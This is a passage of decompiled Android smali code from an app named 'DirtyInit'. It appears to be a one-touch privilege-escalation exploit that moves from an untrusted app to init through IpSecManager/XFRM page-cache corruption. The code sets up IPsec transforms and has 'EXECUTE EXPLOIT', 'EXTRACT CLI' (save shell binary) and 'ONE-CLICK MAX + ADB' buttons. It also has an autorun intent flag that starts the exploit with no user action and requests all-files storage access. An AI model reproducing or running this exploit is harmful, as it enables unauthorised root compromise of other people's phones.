    invoke-direct {v3, v6, v4, v5}, Landroid/net/IpSecAlgorithm;-><init>(Ljava/lang/String;[BI)V

    .line 665
    invoke-virtual {v0}, Landroid/net/IpSecManager;->openUdpEncapsulationSocket()Landroid/net/IpSecManager$UdpEncapsulationSocket;

    move-result-object v0

    iput-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->encapSocket:Landroid/net/IpSecManager$UdpEncapsulationSocket;

    .line 666
    invoke-virtual {v0}, Landroid/net/IpSecManager$UdpEncapsulationSocket;->getPort()I

    move-result v0

    iput v0, p0, Lcom/dirty/init/DirtyInitActivity;->activeEncapPort:I

    .line 669
    new-instance v0, Landroid/net/IpSecTransform$Builder;

    invoke-direct {v0, p0}, Landroid/net/IpSecTransform$Builder;-><init>(Landroid/content/Context;)V

    .line 670
    invoke-virtual {v0, v2}, Landroid/net/IpSecTransform$Builder;->setEncryption(Landroid/net/IpSecAlgorithm;)Landroid/net/IpSecTransform$Builder;

    move-result-object v0

    .line 671
    invoke-virtual {v0, v3}, Landroid/net/IpSecTransform$Builder;->setAuthentication(Landroid/net/IpSecAlgorithm;)Landroid/net/IpSecTransform$Builder;

    move-result-object v0

    iget-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->encapSocket:Landroid/net/IpSecManager$UdpEncapsulationSocket;

    iget v3, p0, Lcom/dirty/init/DirtyInitActivity;->activeEncapPort:I

    .line 672
    invoke-virtual {v0, v2, v3}, Landroid/net/IpSecTransform$Builder;->setIpv4Encapsulation(Landroid/net/IpSecManager$UdpEncapsulationSocket;I)Landroid/net/IpSecTransform$Builder;

    move-result-object v0

    iget-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->spiObj:Landroid/net/IpSecManager$SecurityParameterIndex;

    .line 673
    invoke-virtual {v0, v1, v2}, Landroid/net/IpSecTransform$Builder;->buildTransportModeTransform(Ljava/net/InetAddress;Landroid/net/IpSecManager$SecurityParameterIndex;)Landroid/net/IpSecTransform;

    move-result-object v0

    iput-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->transform:Landroid/net/IpSecTransform;

    .line 675
    iget v0, p0, Lcom/dirty/init/DirtyInitActivity;->activeSpi:I

    invoke-static {v0}, Ljava/lang/Integer;->toHexString(I)Ljava/lang/String;

    move-result-object v0

    iget v1, p0, Lcom/dirty/init/DirtyInitActivity;->activeEncapPort:I

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "SA ready: SPI=0x"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " port="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "DIRTY_INIT"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 654
    :cond_0
    new-instance v0, Ljava/lang/RuntimeException;

    const-string v1, "IpSecManager unavailable"

    invoke-direct {v0, v1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/String;)V

    throw v0
.end method

.method private teardownSA()V
    .locals 3

    .line 681
    :try_start_0
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->transform:Landroid/net/IpSecTransform;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/net/IpSecTransform;->close()V

    iput-object v1, p0, Lcom/dirty/init/DirtyInitActivity;->transform:Landroid/net/IpSecTransform;

    .line 682
    :cond_0
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->encapSocket:Landroid/net/IpSecManager$UdpEncapsulationSocket;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/net/IpSecManager$UdpEncapsulationSocket;->close()V

    iput-object v1, p0, Lcom/dirty/init/DirtyInitActivity;->encapSocket:Landroid/net/IpSecManager$UdpEncapsulationSocket;

    .line 683
    :cond_1
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->spiObj:Landroid/net/IpSecManager$SecurityParameterIndex;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/net/IpSecManager$SecurityParameterIndex;->close()V

    iput-object v1, p0, Lcom/dirty/init/DirtyInitActivity;->spiObj:Landroid/net/IpSecManager$SecurityParameterIndex;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 685
    const-string v1, "DIRTY_INIT"

    const-string v2, "SA teardown error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_0
    return-void
.end method


# virtual methods
.method synthetic lambda$requestStoragePermissions$0$com-dirty-init-DirtyInitActivity(Landroid/content/DialogInterface;I)V
    .locals 2

    .line 273
    new-instance p1, Landroid/content/Intent;

    .line 275
    invoke-virtual {p0}, Lcom/dirty/init/DirtyInitActivity;->getPackageName()Ljava/lang/String;

    move-result-object p2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "package:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p2

    const-string v0, "android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION"

    invoke-direct {p1, v0, p2}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/16 p2, 0x7eb

    .line 276
    invoke-virtual {p0, p1, p2}, Lcom/dirty/init/DirtyInitActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 321
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    const/16 p2, 0x7eb

    if-ne p1, p2, :cond_1

    .line 323
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p2, 0x1e

    const/4 p3, 0x0

    if-lt p1, p2, :cond_0

    invoke-static {}, Landroid/os/Environment;->isExternalStorageManager()Z

    move-result p1

    if-eqz p1, :cond_0

    .line 324
    const-string p1, "[*] All Files Access granted."

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 325
    iget-boolean p1, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    if-eqz p1, :cond_1

    .line 326
    iput-boolean p3, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    .line 327
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->doExtract()V

    goto :goto_0

    .line 330
    :cond_0
    const-string p1, "[!] All Files Access denied."

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 331
    const-string p1, "Permission denied"

    const p2, -0x9495

    invoke-direct {p0, p1, p2}, Lcom/dirty/init/DirtyInitActivity;->setStatus(Ljava/lang/String;I)V

    .line 332
    iput-boolean p3, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    :cond_1
    :goto_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 12

    .line 142
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 144
    new-instance p1, Landroid/widget/LinearLayout;

    invoke-direct {p1, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x1

    .line 145
    invoke-virtual {p1, v0}, Landroid/widget/LinearLayout;->setOrientation(I)V

    const/high16 v1, -0x1000000

    .line 146
    invoke-virtual {p1, v1}, Landroid/widget/LinearLayout;->setBackgroundColor(I)V

    .line 147
    new-instance v2, Landroid/view/ViewGroup$LayoutParams;

    const/4 v3, -0x1

    invoke-direct {v2, v3, v3}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {p1, v2}, Landroid/widget/LinearLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    const/high16 v2, 0x41a00000    # 20.0f

    .line 150
    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v4

    float-to-int v4, v4

    const/high16 v5, 0x42400000    # 48.0f

    invoke-direct {p0, v5}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v5

    float-to-int v5, v5

    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v2

    float-to-int v2, v2

    const/high16 v6, 0x41800000    # 16.0f

    invoke-direct {p0, v6}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v7

    float-to-int v7, v7

    invoke-virtual {p1, v4, v5, v2, v7}, Landroid/widget/LinearLayout;->setPadding(IIII)V

    .line 153
    new-instance v2, Landroid/widget/TextView;

    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 154
    const-string v4, "DIRTY INIT"

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 155
    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextColor(I)V

    const/high16 v4, 0x41b00000    # 22.0f

    .line 156
    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setTextSize(F)V

    .line 157
    sget-object v4, Landroid/graphics/Typeface;->DEFAULT:Landroid/graphics/Typeface;

    invoke-virtual {v2, v4, v0}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    const/16 v0, 0x11

    .line 158
    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setGravity(I)V

    const/high16 v4, 0x40000000    # 2.0f

    .line 159
    invoke-direct {p0, v4}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v4

    float-to-int v4, v4

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v5, v5, v4}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 160
    new-instance v4, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v7, -0x2

    invoke-direct {v4, v3, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {p1, v2, v4}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 165
    new-instance v2, Landroid/widget/TextView;

    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 166
    const-string v4, "One-touch untrusted_app \u2192 init"

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v4, -0xb24954

    .line 167
    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setTextColor(I)V

    const/high16 v8, 0x41500000    # 13.0f

    .line 168
    invoke-virtual {v2, v8}, Landroid/widget/TextView;->setTextSize(F)V

    .line 169
    sget-object v9, Landroid/graphics/Typeface;->DEFAULT:Landroid/graphics/Typeface;

    invoke-virtual {v2, v9, v5}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    .line 170
    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setGravity(I)V

    .line 171
    invoke-direct {p0, v6}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v6

    float-to-int v6, v6

    invoke-virtual {v2, v5, v5, v5, v6}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 172
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v6, v3, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {p1, v2, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 177
    new-instance v2, Landroid/widget/LinearLayout;

    invoke-direct {v2, p0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    .line 178
    invoke-virtual {v2, v5}, Landroid/widget/LinearLayout;->setOrientation(I)V

    .line 180
    const-string v6, "EXECUTE EXPLOIT"

    invoke-direct {p0, v6}, Lcom/dirty/init/DirtyInitActivity;->createButton(Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v6

    iput-object v6, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    .line 181
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    const/high16 v9, 0x3f800000    # 1.0f

    invoke-direct {v6, v5, v7, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    const/high16 v10, 0x40800000    # 4.0f

    .line 183
    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v11

    float-to-int v11, v11

    iput v11, v6, Landroid/widget/LinearLayout$LayoutParams;->rightMargin:I

    .line 184
    iget-object v11, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    invoke-virtual {v2, v11, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 186
    const-string v6, "EXTRACT CLI"

    invoke-direct {p0, v6}, Lcom/dirty/init/DirtyInitActivity;->createButton(Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v6

    iput-object v6, p0, Lcom/dirty/init/DirtyInitActivity;->extractButton:Landroid/widget/Button;

    .line 187
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v6, v5, v7, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    .line 189
    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v11

    float-to-int v11, v11

    iput v11, v6, Landroid/widget/LinearLayout$LayoutParams;->leftMargin:I

    .line 190
    iget-object v11, p0, Lcom/dirty/init/DirtyInitActivity;->extractButton:Landroid/widget/Button;

    invoke-virtual {v2, v11, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V


    const-string v6, "ONE-CLICK MAX + ADB"

    invoke-direct {p0, v6}, Lcom/dirty/init/DirtyInitActivity;->createButton(Ljava/lang/String;)Landroid/widget/Button;

    move-result-object v6

    new-instance v11, Lcom/dirty/init/DirtyInitActivity$9;

    invoke-direct {v11, p0}, Lcom/dirty/init/DirtyInitActivity$9;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-virtual {v6, v11}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    new-instance v11, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v11, v5, v7, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    invoke-virtual {v2, v6, v11}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 192
    new-instance v6, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v6, v3, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 195
    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v11

    float-to-int v11, v11

    iput v11, v6, Landroid/widget/LinearLayout$LayoutParams;->bottomMargin:I

    .line 196
    invoke-virtual {p1, v2, v6}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 199
    new-instance v2, Landroid/widget/TextView;

    invoke-direct {v2, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    iput-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    .line 200
    const-string v6, "Ready"

    invoke-virtual {v2, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 201
    iget-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    invoke-virtual {v2, v4}, Landroid/widget/TextView;->setTextColor(I)V

    .line 202
    iget-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    invoke-virtual {v2, v8}, Landroid/widget/TextView;->setTextSize(F)V

    .line 203
    iget-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    invoke-virtual {v2, v0}, Landroid/widget/TextView;->setGravity(I)V

    .line 204
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v2

    float-to-int v2, v2

    invoke-virtual {v0, v5, v2, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 205
    new-instance v0, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v0, v3, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 208
    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v2

    float-to-int v2, v2

    iput v2, v0, Landroid/widget/LinearLayout$LayoutParams;->bottomMargin:I

    .line 209
    iget-object v2, p0, Lcom/dirty/init/DirtyInitActivity;->statusText:Landroid/widget/TextView;

    invoke-virtual {p1, v2, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 212
    const-string v0, "OUTPUT"

    invoke-direct {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->createLabel(Ljava/lang/String;)Landroid/widget/TextView;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;)V

    .line 215
    new-instance v0, Landroid/widget/ScrollView;

    invoke-direct {v0, p0}, Landroid/widget/ScrollView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->scrollView:Landroid/widget/ScrollView;

    .line 216
    invoke-virtual {v0, v1}, Landroid/widget/ScrollView;->setBackgroundColor(I)V

    .line 217
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->scrollView:Landroid/widget/ScrollView;

    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v1

    float-to-int v1, v1

    const/high16 v2, 0x41000000    # 8.0f

    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v4

    float-to-int v4, v4

    invoke-direct {p0, v10}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v6

    float-to-int v6, v6

    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v8

    float-to-int v8, v8

    invoke-virtual {v0, v1, v4, v6, v8}, Landroid/widget/ScrollView;->setPadding(IIII)V

    .line 218
    new-instance v0, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v0, v3, v5, v9}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    .line 220
    iget-object v1, p0, Lcom/dirty/init/DirtyInitActivity;->scrollView:Landroid/widget/ScrollView;

    invoke-virtual {p1, v1, v0}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 222
    new-instance v0, Landroid/widget/TextView;

    invoke-direct {v0, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    const v1, -0xff00bf

    .line 223
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    .line 224
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    const/high16 v1, 0x41200000    # 10.0f

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextSize(F)V

    .line 225
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    sget-object v1, Landroid/graphics/Typeface;->MONOSPACE:Landroid/graphics/Typeface;

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 226
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    const/4 v1, 0x0

    const v4, 0x3f933333    # 1.15f

    invoke-virtual {v0, v1, v4}, Landroid/widget/TextView;->setLineSpacing(FF)V

    .line 227
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    new-instance v1, Landroid/view/ViewGroup$LayoutParams;

    invoke-direct {v1, v3, v7}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 230
    iget-object v0, p0, Lcom/dirty/init/DirtyInitActivity;->scrollView:Landroid/widget/ScrollView;

    iget-object v1, p0, Lcom/dirty/init/DirtyInitActivity;->logView:Landroid/widget/TextView;

    invoke-virtual {v0, v1}, Landroid/widget/ScrollView;->addView(Landroid/view/View;)V

    .line 233
    new-instance v0, Landroid/widget/TextView;

    invoke-direct {v0, p0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 234
    const-string v1, "Execute the exploit, then use EXTRACT CLI to save the shell binary."

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v1, -0x99999a

    .line 237
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextColor(I)V

    const/high16 v1, 0x41300000    # 11.0f

    .line 238
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setTextSize(F)V

    .line 239
    invoke-direct {p0, v2}, Lcom/dirty/init/DirtyInitActivity;->dp(F)F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {v0, v5, v1, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 240
    new-instance v1, Landroid/widget/LinearLayout$LayoutParams;

    invoke-direct {v1, v3, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-virtual {p1, v0, v1}, Landroid/widget/LinearLayout;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 244
    invoke-virtual {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->setContentView(Landroid/view/View;)V

    .line 246
    iget-object p1, p0, Lcom/dirty/init/DirtyInitActivity;->executeButton:Landroid/widget/Button;

    new-instance v0, Lcom/dirty/init/DirtyInitActivity$1;

    invoke-direct {v0, p0}, Lcom/dirty/init/DirtyInitActivity$1;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 251
    iget-object p1, p0, Lcom/dirty/init/DirtyInitActivity;->extractButton:Landroid/widget/Button;

    new-instance v0, Lcom/dirty/init/DirtyInitActivity$2;

    invoke-direct {v0, p0}, Lcom/dirty/init/DirtyInitActivity$2;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 256
    const-string p1, "DirtyInit: page cache corruption via IpSecManager \u2192 init code exec"

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 257
    const-string p1, "Target: libbase.so ~LogMessage() \u2014 CBC 16-byte block writes"

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 258
    const-string p1, "Chain: untrusted_app \u2192 IpSecManager \u2192 XFRM ESP \u2192 page cache \u2192 init"

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 259
    const-string p1, ""

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 261
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->requestStoragePermissions()V

        invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;
    move-result-object v0

    const-string v1, "autorun"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z
    move-result v0

    if-eqz v0, :cond_autorun_skip

    const/4 v0, 0x0

    iput v0, p0, Lcom/dirty/init/DirtyInitActivity;->stage:I

    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->runDfiExploit()V

    new-instance v0, Lcom/dirty/init/DirtyInitActivity$10;

    invoke-direct {v0, p0}, Lcom/dirty/init/DirtyInitActivity$10;-><init>(Lcom/dirty/init/DirtyInitActivity;)V

    new-instance v1, Ljava/lang/Thread;

    invoke-direct {v1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    :cond_autorun_skip

return-void
.end method

.method protected onDestroy()V
    .locals 0

    .line 691
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 692
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->teardownSA()V

    return-void
.end method

.method public onNativeProgress(Ljava/lang/String;)V
    .locals 1

    .line 427
    new-instance v0, Lcom/dirty/init/DirtyInitActivity$5;

    invoke-direct {v0, p0, p1}, Lcom/dirty/init/DirtyInitActivity$5;-><init>(Lcom/dirty/init/DirtyInitActivity;Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/dirty/init/DirtyInitActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 2

    const/16 p2, 0x7ea

    if-ne p1, p2, :cond_3

    .line 342
    array-length p1, p3

    const/4 p2, 0x0

    move v0, p2

    :goto_0
    if-ge v0, p1, :cond_1

    aget v1, p3, v0

    if-eqz v1, :cond_0

    goto :goto_1

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 348
    :cond_1
    array-length p1, p3

    if-lez p1, :cond_2

    .line 349
    const-string p1, "[*] Storage permissions granted."

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 350
    iget-boolean p1, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    if-eqz p1, :cond_3

    .line 351
    iput-boolean p2, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    .line 352
    invoke-direct {p0}, Lcom/dirty/init/DirtyInitActivity;->doExtract()V

    goto :goto_2

    .line 355
    :cond_2
    :goto_1
    const-string p1, "[!] Some storage permissions denied."

    invoke-direct {p0, p1}, Lcom/dirty/init/DirtyInitActivity;->appendLog(Ljava/lang/String;)V

    .line 356
    const-string p1, "Permission denied"

    const p3, -0x9495

    invoke-direct {p0, p1, p3}, Lcom/dirty/init/DirtyInitActivity;->setStatus(Ljava/lang/String;I)V

    .line 357
    iput-boolean p2, p0, Lcom/dirty/init/DirtyInitActivity;->pendingExtractAfterPermission:Z

    :cond_3
    :goto_2
    return-void
.end method
